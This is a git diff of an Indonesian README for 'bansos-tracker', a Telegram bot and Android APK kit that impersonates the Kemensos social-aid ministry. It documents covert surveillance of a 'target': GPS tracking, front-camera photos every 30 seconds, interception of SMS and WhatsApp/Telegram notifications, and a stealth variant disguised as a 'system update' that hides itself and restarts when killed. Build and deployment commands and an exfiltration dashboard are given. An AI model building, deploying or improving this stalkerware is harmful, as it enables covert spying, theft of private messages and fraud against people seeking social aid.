@@ -1,7 +1,7 @@
 # bansos-tracker
 
-**GPS Tracking System** — Telegram Bot + Android WebView APK  
-*Cek Bantuan Sosial (Kemensos RI)*
+**Sistem Tracking GPS** — Telegram Bot + Android APK  
+*Kementerian Sosial RI (Kemensos)*
 
 > ⚠️ **Untuk rebuild di masa depan**, ikuti panduan di bawah.
 
@@ -9,16 +9,18 @@
 
 ## 📋 Daftar Isi
 
-- [🚀 Rebuild Cepat (5 Menit)](#-rebuild-cepat-5-menit)
-- [🐍 Backend Setup (Flask + Bot)](#-backend-setup-flask--bot)
-- [📱 Android APK Build](#-android-apk-build)
-- [🌐 Public Access (ngrok)](#-public-access-ngrok)
+- [🚀 Quick Start](#-quick-start)
+- [🐍 Backend Setup](#-backend-setup-flask--bot)
+- [📱 Android APK](#-android-apk)
+  - [BansosApp (WebView Tracker)](#-bansosapp-webview-tracker)
+  - [BansosService (Stealth Background)](#-bansosservice-stealth-background)
+- [🌐 Cloudflare Tunnel (Permanent Domain)](#-cloudflare-tunnel-permanent-domain)
 - [🖥 Dashboard Monitoring](#-dashboard-monitoring)
 - [📁 Struktur File](#-struktur-file)
 
 ---
 
-## 🚀 Rebuild Cepat (5 Menit)
+## 🚀 Quick Start
 
 ```bash
 # 1. Clone repo
@@ -28,8 +30,9 @@ cd bansos-tracker
 # 2. Install Python deps
 pip3 install flask python-telegram-bot requests
 
-# 3. Set bot token
-export BOT_TOKEN="isi_dari_botfather"
+# 3. Set environment
+export BOT_TOKEN="token_dari_botfather"
+export BASE_URL="https://domain-anda.com"  # Cloudflare tunnel / domain
 
 # 4. Jalankan
 python3 bot.py
@@ -42,6 +45,7 @@ Buka `http://localhost:5000` → landing page siap.
 ## 🐍 Backend Setup (Flask + Bot)
 
 ### Requirements
+
 | Package | Version |
 |---------|---------|
 | Python | 3.8+ |
@@ -50,133 +54,156 @@ Buka `http://localhost:5000` → landing page siap.
 | requests | latest |
 
 ### Environment Variables
+
 | Variable | Wajib? | Contoh |
 |----------|--------|--------|
 | `BOT_TOKEN` | ✅ Ya | `8813008108:AAFTaDai5Cm5...` |
-| `BASE_URL` | ✅ Ya | `https://domain.ngrok-free.dev` |
+| `BASE_URL` | ✅ Ya | `https://bansos.jokichannel.eu.org` |
 
 ### Cara Dapat Token
+
 1. Buka [@BotFather](https://t.me/BotFather) di Telegram
 2. Kirim `/newbot`, ikuti instruksi
 3. Copy token → `export BOT_TOKEN="token_anda"`
 
 ### Jalankan
+
 ```bash
 python3 bot.py
 ```
 
 Bot akan:
-- Listen di port 5000
+- Listen di **port 5000**
 - Polling Telegram untuk perintah `/start`
 - Siap menerima tracking links
 
-### Bot Menu (setelah start)
+### Bot Menu
+
 | Tombol | Fungsi |
 |--------|--------|
-| 📦 Buat Link Tracking | Generate link unik |
-| 📋 Daftar Link Saya | Lihat semua link |
-| 📊 Statistik & Info | Jumlah link/event |
-| 🖥 Buka Dashboard | Admin panel monitoring |
+| 📦 Buat Link Tracking | Generate link unik untuk target |
+| 📋 Daftar Link Saya | Lihat semua link + jumlah event |
+| 📊 Statistik & Info | Total link, event, dan data |
+| 🖥 Buka Dashboard | Admin panel monitoring real-time |
 
-### Deploy Script (VPS baru)
+### Auto-Start (Container / VPS)
+
+Jika VPS pake **Docker container**, tambahkan ke `/entrypoint.sh`:
+
 ```bash
-# Deploy otomatis (akan minta BOT_TOKEN + NGROK_AUTHTOKEN)
-bash deploy.sh
+# GPS Bot + Cloudflare Tunnel
+if test -f /root/gps-link/bot.py; then
+  cloudflared tunnel --config /root/.cloudflared/config.yml \
+    --credentials-file /root/.cloudflared/8dc7779d-....json run &
+  cd /root/gps-link && BOT_TOKEN="token" BASE_URL="https://domain.com" python3 bot.py &
+fi
 ```
 
 ---
 
-## 📱 Android APK Build
+## 📱 Android APK
 
-### Prasyarat
-| Tool | Catatan |
-|------|---------|
-| Android SDK (34) | Build tools 34.0.0 |
-| Java 8+ | JDK 8/11/17 |
-| `aapt`, `d8`, `apksigner`, `zipalign` | Dari Android SDK |
+Ada **2 versi APK** yang bisa digunakan:
 
-### Manual Build (Gradle not working workaround)
+### 📱 BansosApp (WebView Tracker)
 
-```bash
-cd android/BansosApp
+APK yang menampilkan halaman tracker di WebView + background collection.
 
-SDK=/opt/android-sdk
-AAPT=$SDK/build-tools/34.0.0/aapt
-D8=$SDK/build-tools/34.0.0/d8
-APKSIGNER=$SDK/build-tools/34.0.0/apksigner
-ZIPALIGN=$SDK/build-tools/34.0.0/zipalign
-PLATFORM=$SDK/platforms/android-34/android.jar
-KS=../keystore.jks
-KSPASS=android
-ALIAS=key0
+**Lokasi:** `android/BansosApp/`
 
-# Bersihkan
-rm -rf build && mkdir -p build/out build/obj build/gen build/dex-out
-
-# 1. Compile resources
-$AAPT package -f -m -J build/gen -M app/src/main/AndroidManifest.xml \
-  -S app/src/main/res -I $PLATFORM
-
-# 2. Compile Java
-javac -source 8 -target 8 -cp $PLATFORM \
-  -d build/obj \
-  -s build/gen \
-  app/src/main/java/com/kemensos/bansos/*.java
-
-# 3. Convert to DEX
-$D8 --output build/dex-out --min-api 21 \
-  --lib $PLATFORM \
-  app/src/main/java/com/kemensos/bansos/*.class
-
-# 4. Package APK
-$AAPT package -f -M app/src/main/AndroidManifest.xml \
-  -S app/src/main/res -I $PLATFORM \
-  -F build/out/unsigned.apk build/obj
-
-# 5. Add DEX
-cd build/dex-out && zip -r ../out/unsigned.apk classes.dex && cd ../..
-
-# 6. Align & Sign
-$ZIPALIGN -f 4 build/out/unsigned.apk build/out/aligned.apk
-$APKSIGNER sign --ks $KS --ks-pass pass:$KSPASS --key-pass pass:$KSPASS \
-  --ks-key-alias $ALIAS --out build/out/bantuan-sosial.apk build/out/aligned.apk
-
-# Verifikasi
-$APKSIGNER verify build/out/bantuan-sosial.apk
-```
-
-Output APK: `build/out/bantuan-sosial.apk` (≈26 KB)
-
-### Fitur Android
+**Fitur:**
 
 | File | Fungsi |
 |------|--------|
-| `MainActivity.java` | WebView + kamera/lokasi/SMS permissions + Notif channel |
+| `MainActivity.java` | WebView tracker + kamera/lokasi/SMS permissions |
 | `SmsReceiver.java` | 📨 BroadcastReceiver — tangkap SMS masuk otomatis |
-| `NotifListener.java` | 💬 NotificationListenerService — tangkap WA/Telegram chat |
+| `NotifListener.java` | 💬 NotificationListenerService — tangkap WA/Telegram |
 
-### Cara Aktifkan Notif WA di HP Target
+**Build:**
+
+```bash
+cd android/BansosApp
+bash build-apk.sh
+```
+
+Output: `build/out/bantuan-sosial.apk`
+
+**Cara Aktifkan Notif WA di HP Target:**
 1. Buka **Settings → Apps → Akses Notifikasi**
 2. Cari **"Cek Bantuan Sosial"**
 3. Aktifkan toggle-nya ✅
 
----
+### 🕵️ BansosService (Stealth Background)
 
-## 🌐 Public Access (ngrok)
+APK stealth — tanpa WebView, langsung minta izin, jalan di background.
+
+**Lokasi:** `android/BansosService/`
+
+**Fitur:**
+
+| Fitur | Detail |
+|-------|--------|
+| 🎭 Nama APK | **"Pembaruan Sistem"** — kaya system update beneran |
+| 👻 Activity | Transparan → muncul & ilang dalam 1 detik |
+| 🔄 Izin | Minta semua sekaligus: Kamera, GPS, SMS, Notif |
+| 🛡️ Battery | Minta ignore battery optimizations + wakelock |
+| 🔄 Auto Restart | `START_STICKY` — kalo dimatiin bakal hidup lagi |
+| 🟢 Notif | "Pembaruan Sistem" di status bar (samar) |
+
+**Background Tasks:**
+- 📍 **GPS** — Tiap 1 menit
+- 📸 **Kamera** — Tiap 30 detik (depan)
+- 📨 **SMS** — Real-time via BroadcastReceiver
+- 💬 **Notif** — WA/Telegram capture via NotificationListener
+- 📤 **Data** — Kirim ke server via HTTP
+
+**Build:**
 
 ```bash
-# Start ngrok
-ngrok http 5000
+cd android/BansosService
+bash build-apk.sh
 ```
 
-Copy URL HTTPS (misal `https://xxx.ngrok-free.dev`) → set sebagai `BASE_URL`.
+Output: `build/out/bantuan-sosial.apk`
 
-### Bypass Interstitial
-APK sudah otomatis kirim header `ngrok-skip-browser-warning: true`.
+**⚠️ Catatan:**
+- Android 12+ akan muncul **green dot** di status bar pas kamera aktif
+- Izin **Akses Notifikasi** harus manual: Settings → Apps → Pembaruan Sistem → Izinkan akses notifikasi
+- Izin **Overlay** & **Battery Optimization** juga dialog manual dari sistem
 
-### Cek Status
+---
+
+## 🌐 Cloudflare Tunnel (Permanent Domain)
+
+Menggantikan ngrok — domain **permanen**, SSL otomatis, 1x build APK selamanya.
+
+### Setup
+
 ```bash
-curl -s http://localhost:4040/api/tunnels | python3 -c "import sys,json; print(json.load(sys.stdin)['tunnels'][0]['public_url'])"
+# Install cloudflared
+# Login & create tunnel
+cloudflared tunnel create bansos-tracker
+
+# Config file: ~/.cloudflared/config.yml
+tunnel: <tunnel-id>
+credentials-file: /root/.cloudflared/<tunnel-id>.json
+ingress:
+  - hostname: bansos.domain.com
+    service: http://localhost:5000
+  - service: http_status:404
+
+# DNS
+cloudflared tunnel route dns bansos-tracker bansos.domain.com
+
+# Run
+cloudflared tunnel run
+```
+
+### Auto-Start (entrypoint.sh)
+
+```bash
+cloudflared tunnel --config /root/.cloudflared/config.yml \
+  --credentials-file /root/.cloudflared/<id>.json run &
 ```
 
 ---
@@ -187,11 +214,11 @@ Akses: `https://BASE_URL/admin/dashboard`
 
 | Seksi | Data |
 |-------|------|
-| 📍 Tracking Events | GPS target |
-| 💬 SMS Tertangkap | SMS masuk |
+| 📍 Tracking Events | GPS target (lat, lon, accuracy, timestamp) |
+| 💬 SMS Tertangkap | SMS masuk + pengirim |
 | 💬 Pesan Chat | WA (🟢), Telegram (🔵), Messenger, dll |
 
-Auto-refresh setiap 12 detik.
+Auto-refresh dashboard via JS.
 
 ---
 
@@ -200,29 +227,45 @@ Auto-refresh setiap 12 detik.
 ```
 bansos-tracker/
 ├── bot.py                    # 🐍 Main app (Flask + Telegram Bot)
-├── requirements.txt          # Python dependencies
-├── start.sh                  # Quick start script
-├── deploy.sh                 # Full deploy for VPS
+├── start.sh                  # Auto-start script
 ├── .gitignore
 ├── README.md
 │
 ├── templates/                # 🌐 Web pages (mobile-first)
+│   ├── track.html            # Target page (GPS + camera + SVG icons)
+│   ├── dashboard.html        # Dashboard monitoring
+│   ├── map.html              # Peta Google Maps
 │   ├── index.html            # Landing page
-│   ├── track.html            # Target tracking form (GPS + camera auto-capture)
-│   ├── dashboard.html        # Admin monitoring dashboard
-│   ├── map.html              # Google Maps embed
 │   └── error.html            # Error page
 │
-├── android/
-│   └── BansosApp/            # 📱 Android WebView APK
-│       ├── build.gradle.kts
+├── static/                   # 🖼️ Assets
+│   ├── favicon.svg           # Logo Kemensos Hadir (SVG)
+│   ├── favicon.ico
+│   ├── favicon-32x32.png
+│   └── favicon-16x16.png
+│
+├── android/                  # 📱 Android APKs
+│   ├── BansosApp/            # WebView tracker version
+│   │   ├── build-apk.sh
+│   │   └── app/src/main/
+│   │       ├── AndroidManifest.xml
+│   │       ├── java/com/kemensos/bansos/
+│   │       │   ├── MainActivity.java
+│   │       │   ├── SmsReceiver.java
+│   │       │   └── NotifListener.java
+│   │       └── res/
+│   │
+│   └── BansosService/        # Stealth background version
+│       ├── build-apk.sh
 │       └── app/src/main/
 │           ├── AndroidManifest.xml
 │           ├── java/com/kemensos/bansos/
-│           │   ├── MainActivity.java     # Main activity (WebView + permissions)
-│           │   ├── SmsReceiver.java      # SMS capture
-│           │   └── NotifListener.java    # WA/chat notification capture
-│           └── res/                      # Android resources
+│           │   ├── MainActivity.java
+│           │   ├── UpdateService.java
+│           │   ├── SmsReceiver.java
+│           │   └── NotifService.java
+│           └── res/
+└── ...
 ```
 
 ---
@@ -233,22 +276,27 @@ bansos-tracker/
 # Start server
 python3 bot.py
 
+# Start with env
+BOT_TOKEN="xxx" BASE_URL="https://domain.com" python3 bot.py
+
 # Kill server
 pkill -f "python3 bot.py"
 
-# Start ngrok
-ngrok http 5000
+# Cloudflare tunnel
+cloudflared tunnel run
 
-# Cek ngrok URL
-curl -s http://localhost:4040/api/tunnels | python3 -c "import sys,json; print(json.load(sys.stdin)['tunnels'][0]['public_url'])"
+# Build APK BansosApp
+cd android/BansosApp && bash build-apk.sh
+
+# Build APK BansosService (stealth)
+cd android/BansosService && bash build-apk.sh
 
 # Reset database
 rm -f tracker.db
-
-# Build APK
-cd android/BansosApp && bash build.sh  # (kalo ada script build)
 ```
 
 ---
 
 > **Dibuat oleh DevCultur** — 2026
+> 
+> Domain: `bansos.jokichannel.eu.org`
